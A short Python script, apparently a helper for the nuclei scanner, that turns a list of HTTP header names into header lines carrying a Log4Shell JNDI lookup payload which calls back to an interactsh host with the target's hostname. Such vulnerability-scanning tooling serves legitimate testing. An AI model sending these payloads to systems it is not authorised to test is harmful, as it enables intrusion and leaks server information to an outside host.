#!/usr/bin/env python3
''' Generate nuclei tempalte from file '''
from time import strftime 

import os
import argparse 
import urllib.parse
import unidecode
import re

parser = argparse.ArgumentParser() 
parser.add_argument("-f", required=True, help="enter fileName of your header list")
parser.add_argument("-o", required=True, help="enter fileName of your output file")

args = parser.parse_args()
outputDir = "output/"
if(not os.path.exists(outputDir)):
	os.makedirs(outputDir)
print(str(args.f).capitalize()+" directory is created.") 

def slugify(text):
    text = unidecode.unidecode(text).lower()
    return re.sub(r'[\W_]+', '', text)

def main() : 
	f=open(args.f,"r")
	o=open(outputDir+strftime("%Y%m%d-%H%M%S")+args.o,"w")

	for line in f.readlines():
		header = line[0:-1:]
		header_sub= slugify(line)
		#urllib.parse.quote_plus(line[0:-1:]) to put in url
		request = r""+header+": ${jndi:ldap://${hostName}."+header_sub+".{{interactsh-url}}}"
		o.write(request+"\n")
	f.close()
	o.close()
main()
